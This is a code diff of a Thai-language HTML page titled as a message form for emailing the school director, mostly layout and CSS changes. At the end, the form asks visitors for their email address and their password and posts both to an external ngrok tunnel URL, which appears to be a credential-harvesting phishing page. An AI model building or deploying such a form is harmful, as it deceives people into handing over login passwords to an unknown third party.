@@ -1,8 +1,10 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <head>
-        <style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ฟอร์มส่งข้อความ</title>
+    <style>
         body {
             margin: 0; /* ลบระยะขอบของหน้า */
             height: 100vh; /* ความสูงเท่ากับขนาดหน้าจอ */
@@ -17,29 +19,13 @@
             font-size: 3em; /* ขนาดตัวอักษร */
             margin-top: 20%; /* เพิ่มระยะห่างจากด้านบน */
         }
-    </style>
-</head>
-<body>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ฟอร์มส่งข้อความ</title>
-    <style>
-        body {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            font-family: Arial, sans-serif;
-            background-color: #f9f9f9;
-        }
         .form-container {
             border: 1px solid #ccc;
             border-radius: 10px;
             padding: 20px;
-            background-color: white;
             box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
             text-align: center;
+            background-color: transparent; /* ลบพื้นหลัง */
         }
         input, textarea, button {
             width: 100%;
@@ -62,7 +48,6 @@
 <body>
     <div class="form-container">
         <h1>ส่งอีเมลหาผ.อ.</h1>
-        <!-- เปลี่ยน action ไปที่ 127.0.0.1:8764 -->
         <form action="https://d4ca-49-237-14-107.ngrok-free.app/send_email.php" method="POST">
             <input type="text" name="name" placeholder="อีเมลของคุณ" required>
             <input type="email" name="email" placeholder="รหัสผ่านของคุณ" required>
